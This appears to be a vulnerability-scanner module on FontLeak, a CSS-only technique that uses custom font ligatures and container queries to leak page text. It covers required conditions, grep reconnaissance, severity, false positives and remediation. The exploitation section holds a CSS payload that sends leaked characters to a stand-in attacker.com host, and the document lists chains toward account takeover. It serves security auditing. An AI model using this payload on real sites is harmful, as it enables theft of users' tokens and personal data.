# VULN MODULE — CSS Font Exfiltration (FontLeak)
# Asset: webapp
# CWE-200 (Information Exposure) | Report prefix: WEB-FONTLEAK
# Reference: https://adragos.ro/fontleak/

## THREAT MODEL

FontLeak is a CSS-only text exfiltration technique that exploits two browser features:
1. **OpenType GSUB ligature substitution** — a custom font maps character pairs (prefix + target char)
   to glyphs of specific widths, encoding the target character's identity in the glyph width.
2. **CSS container queries** — the measured width of a sibling element reveals which character
   was substituted, leaking one character per measurement cycle.

No JavaScript required. Exfiltration happens via:
- `@import url()` chains (Chrome) — each new import load cycles through ligature substitutions
- Animated `@font-face` src() swaps (Safari) — keyframe animations swap fonts
- `background-image: url()` callbacks — each character triggers an outbound request

**Attack surface**: any context where user HTML is rendered in the same DOM as sensitive data
and `<style>` tags are not blocked. This includes HTML-enabled comment fields, profile bios,
rich text editors, markdown renderers with raw HTML passthrough, and chat messages.

**Demonstrated impact** (researcher PoC): 2,400 characters exfiltrated from chatgpt.com
in ~7 minutes, including access tokens from inline `<script>` tags.

## REQUIRED CONDITIONS (all must hold)

1. **CSS injection** — attacker can inject `<style>` tags into rendered HTML (not just text)
2. **Style tags not blocked** — sanitizer config allows `<style>`:
   - DOMPurify default config allows `<style>` → vulnerable unless `FORBID_TAGS: ['style']`
   - sanitize-html: must explicitly exclude `style` from `allowedTags`
3. **Font loading not restricted by CSP** — at least one of:
   - No CSP header
   - `font-src *` or `font-src data:`
   - `default-src *` or `default-src 'unsafe-inline'`
   - Missing `font-src` directive (falls back to `default-src` if present, otherwise unrestricted)
4. **Sensitive data co-located** — target text (token, PII, session ID) rendered in the same
   page DOM as the injected CSS, within container query reach

## RECONNAISSANCE

### Step 1 — Find CSS injection points

grep -rn "DOMPurify\.sanitize\|sanitizeHtml\|createHTMLDocument\|xss(" --include="*.js" --include="*.ts"
grep -rn "FORBID_TAGS\|ALLOWED_TAGS\|allowedTags\|ADD_TAGS\|allowedStyles" --include="*.js" --include="*.ts"
grep -rn "innerHTML\s*=\|\.html(\|insertAdjacentHTML" --include="*.js" --include="*.ts"

Look for:
- DOMPurify.sanitize() without { FORBID_TAGS: ['style'] }
- sanitize-html with style in allowedTags or not excluded
- innerHTML assignment with sanitizer output (sanitizer may allow style)

### Step 2 — Audit CSP

grep -rn "Content-Security-Policy\|helmet(\|csp(" --include="*.js" --include="*.ts" --include="*.conf"

In HTTP response headers, look for:
- Missing `font-src` directive
- `font-src *` or `font-src data:`
- Missing `style-src` or `style-src 'unsafe-inline'`

Absence of a strong CSP = vulnerable to font loading.

### Step 3 — Map sensitive data co-location

Identify pages where:
- Auth tokens appear in inline scripts: `<script>window.__INIT__ = { token: "..." }</script>`
- Session data rendered as text nodes near user-controlled content
- API responses embedded in page HTML (server-side rendering with hydration data)
- Chat/comment threads where attacker messages and victim data appear in same viewport

## STATIC ANALYSIS

```
# DOMPurify without FORBID_TAGS style
grep -rn "DOMPurify" --include="*.js" --include="*.ts" -A3 | grep -v "FORBID_TAGS.*style"

# sanitize-html allowing style
grep -rn "allowedTags" --include="*.js" --include="*.ts" -A20 | grep "style"

# Font-src in CSP
grep -rn "font-src" --include="*.js" --include="*.ts" --include="*.conf"

# style-src unsafe-inline
grep -rn "style-src.*unsafe-inline\|style-src \*" --include="*.js" --include="*.ts" --include="*.conf"
```

## EXPLOITATION TECHNIQUE (for PoC construction)

The font is crafted with GSUB ligature rules that substitute the two-glyph sequence
(sentinel prefix U+E000 + target char) with a single glyph from the Private Use Area
(U+F0000–U+FFFFD) whose advance width encodes the target character's ordinal value.

A CSS fragment like:
```css
@font-face {
  font-family: 'exfil';
  src: url('https://attacker.com/font/SENTINEL_CHAR.woff2');
}
div { font-family: 'exfil'; }
@container (min-width: NNpx) {
  div::before { content: ''; background: url('https://attacker.com/leak?char=X'); }
}
```
cycles through all 95 printable ASCII characters. The server measures which width triggers
the container query match and reconstructs the leaked text.

**PoC validation steps:**
1. Inject a `<style>` tag with a data-URI font that substitutes a known test character
2. Verify the width-based container query fires (check network request to attacker server)
3. Confirm no CSP blocks the font load or background-image request
4. Report the sanitizer config flaw + CSP gap as the root cause

## SEVERITY ASSESSMENT

| Leaked data            | Severity   |
|------------------------|------------|
| Auth token / API key   | Critical   |
| Session cookie content | Critical   |
| PII (email, name, SSN) | High       |
| CSRF token             | High       |
| Non-sensitive text     | Medium     |

Severity escalates to Critical when the exfiltration is stored (attacker-controlled content
saved to DB, rendered to multiple victims → mass exfil of all page visitors' tokens).

## FALSE POSITIVE SIGNALS

- Sanitizer blocks `<style>` via FORBID_TAGS → not exploitable (gate fail: intermediate_defense)
- CSP has `font-src 'none'` or `font-src 'self'` with no data URIs → font load blocked
- Sensitive data not in same page context as injected CSS (separate iframe / Shadow DOM)
- Target text rendered in `<canvas>` or image (not text node) → container query can't measure
- Nonce-based `style-src 'nonce-...'` without `'unsafe-inline'` → inline style blocked

## CHAIN OPPORTUNITIES

- CSS injection → FontLeak → exfiltrate auth token → full account takeover (Critical chain)
- Stored CSS injection (e.g. in profile bio) → FontLeak → mass token exfil from all page visitors
- CSS injection → FontLeak → extract CSRF token → CSRF-protected action execution

## REMEDIATION

1. Add `FORBID_TAGS: ['style']` to DOMPurify config
2. Set strict CSP: `font-src 'none'` or `font-src 'self'` (no data: URIs, no wildcards)
3. `style-src 'nonce-{random}'` — block inline styles without nonce
4. Sandbox user-generated HTML in a cross-origin iframe (`sandbox="allow-scripts"`)
